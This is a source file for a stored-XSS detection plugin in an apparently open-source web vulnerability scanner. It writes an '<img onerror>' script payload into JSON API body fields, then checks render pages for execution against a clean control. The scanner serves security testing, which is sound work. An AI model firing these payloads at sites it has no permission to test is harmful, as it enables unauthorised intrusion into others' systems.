/* ---
id: xss-stored-json-api
name: Stored XSS via JSON API (Write plus Render)
description: Detects stored XSS when a JSON API body field is persisted and later rendered into an executable HTML context, with a two-request write/render flow and the stored oracle's clean control.
author: GASH contributors
severity: high
tags: [xss, stored-xss, injection, json, api]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 60
phase: probe
order: 71
api_version: "1.0"
tests: tests/fixtures/xss-stored-json-api/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xss/xss-stored-json-api.js
// What: Tier 2 stored-XSS plugin for JSON API write endpoints.
// Why: The form-point stored plugin replays the write through the urlencoded
//   form builder, so a JSON API never parses the payload and the stored value
//   never lands. Rebuilding the object around the discovered field and sending
//   application/json needs a script. The write must then be observed on a
//   render page: that second exchange is what makes this stored, not reflected.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const jsonContentType = "application/json";
  const contexts = ["html", "attr-executable", "script", "url", "url-executable"];
  const maxSends = 60;

  // Group JSON body points by base URL: the base is the page that later renders
  // the stored value, and a second base doubles as the clean control.
  const bases = [];
  const byBase = [];
  for (const p of points) {
    if (String(p.paramLocation || "").toLowerCase() !== "body") {
      continue; // write points only; a JSON body is what reaches the store
    }
    if (!p.paramName) {
      continue;
    }
    const base = String(p.url || "").split("?")[0].split("#")[0];
    if (!base) {
      continue;
    }
    let bi = bases.indexOf(base);
    if (bi === -1) {
      bases.push(base);
      byBase.push([]);
      bi = bases.length - 1;
    }
    byBase[bi].push(p);
  }

  let sends = 0;
  const done = [];
  let maxDepth = 0;
  for (let i = 0; i < byBase.length; i++) {
    done.push(false);
    if (byBase[i].length > maxDepth) {
      maxDepth = byBase[i].length;
    }
  }

  // Round-robin over bases so every base gets one attempt before any base gets
  // a second one, and the whole run stays inside the send budget.
  for (let round = 0; round < maxDepth; round++) {
    for (let bi = 0; bi < bases.length; bi++) {
      if (done[bi] || round >= byBase[bi].length) {
        continue;
      }
      if (sends + 2 > maxSends) {
        return candidates;
      }
      const point = byBase[bi][round];
      const name = point.paramName;
      const canary = probe.canary();
      // Tags and quotes are JSON-string safe, so the object stays parseable
      // while the stored value is still an executing pattern in HTML.
      const payload = "<img src=x onerror=alert(" + canary + ")>";
      sends++;
      const storeResp = probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sends++;
      const renderResp = probe.send({ url: bases[bi], method: "GET", paramName: "", paramLocation: "query", value: "" });

      // A sibling render page never received the payload: it is the clean
      // control (and the seed for the opt-in browser-verify pass). With a
      // single base the oracle falls back to a neutralized re-fetch, which for
      // a genuinely stored value stays dirty and therefore rejects.
      let controlUrl = "";
      for (const b of bases) {
        if (b !== bases[bi]) {
          controlUrl = b;
          break;
        }
      }
      const ev = controlUrl
        ? host.oracles.storedExecution(storeResp, renderResp, canary, { contexts: contexts, controlUrl: controlUrl })
        : host.oracles.storedExecution(storeResp, renderResp, canary, contexts);
      if (ev) {
        candidates.push(host.candidate(point, "stored", ev));
        done[bi] = true;
      }
    }
  }
  return candidates;
}
